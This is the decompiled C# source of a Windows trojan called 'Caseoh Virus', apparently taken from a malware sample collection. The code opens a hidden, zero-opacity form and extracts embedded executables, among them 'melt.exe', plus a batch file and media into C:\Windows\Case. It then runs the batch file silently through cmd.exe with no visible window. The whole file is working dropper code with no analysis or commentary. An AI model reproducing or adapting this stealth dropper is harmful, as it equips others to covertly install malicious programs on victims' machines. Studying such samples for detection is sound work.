// Decompiled with JetBrains decompiler
// Type: Caseoh_Virus.Form1
// Assembly: Caseoh Virus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B2670CA6-E3F2-4FDC-91C6-6AAE58ABEC3C
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Trojan\Caseoh.Virus\Caseoh.Virus.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

#nullable disable
namespace Caseoh_Virus;

public class Form1 : Form
{
  private IContainer components;

  public Form1() => this.InitializeComponent();

  private void Form1_Load(object sender, EventArgs e)
  {
    string str1 = "C:\\Windows\\Case";
    if (!Directory.Exists(str1))
      Directory.CreateDirectory(str1);
    string[] strArray = new string[6]
    {
      "Caseoh_Virus.Resources.CaseohGUI.exe",
      "Caseoh_Virus.Resources.caseoh.wav",
      "Caseoh_Virus.Resources.melt.exe",
      "Caseoh_Virus.Resources.ferris.mp4",
      "Caseoh_Virus.Resources.WMPLib.exe",
      "Caseoh_Virus.Resources.WMPStart.bat"
    };
    Assembly executingAssembly = Assembly.GetExecutingAssembly();
    foreach (string str2 in strArray)
    {
      using (Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(str2))
      {
        if (manifestResourceStream != null)
        {
          string nameFromResource = this.GetFileNameFromResource(str2);
          using (FileStream destination = new FileStream(Path.Combine(str1, nameFromResource), FileMode.Create, FileAccess.Write))
            manifestResourceStream.CopyTo((Stream) destination);
        }
        else
        {
          int num = (int) MessageBox.Show(str2 + " not found. Caseoh couldn't extract it!");
        }
      }
    }
    this.RunCmdCommand();
  }

  private string GetFileNameFromResource(string resourceName)
  {
    int num = resourceName.LastIndexOf('.');
    return resourceName.Substring(resourceName.LastIndexOf('.', num - 1) + 1);
  }

  private void RunCmdCommand()
  {
    try
    {
      string str = "cd C:\\Windows\\Case && WMPStart.bat";
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = $"/C \"{str}\"",
        CreateNoWindow = true,
        UseShellExecute = false
      });
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show("An error occurred while running the command: " + ex.Message);
    }
  }

  protected override void Dispose(bool disposing)
  {
    if (disposing && this.components != null)
      this.components.Dispose();
    base.Dispose(disposing);
  }

  private void InitializeComponent()
  {
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = SystemColors.ControlText;
    this.ClientSize = new Size(10, 10);
    this.ControlBox = false;
    this.FormBorderStyle = FormBorderStyle.None;
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Name = nameof (Form1);
    this.Opacity = 0.0;
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.StartPosition = FormStartPosition.Manual;
    this.Text = nameof (Form1);
    this.WindowState = FormWindowState.Minimized;
    this.Load += new EventHandler(this.Form1_Load);
    this.ResumeLayout(false);
  }
}
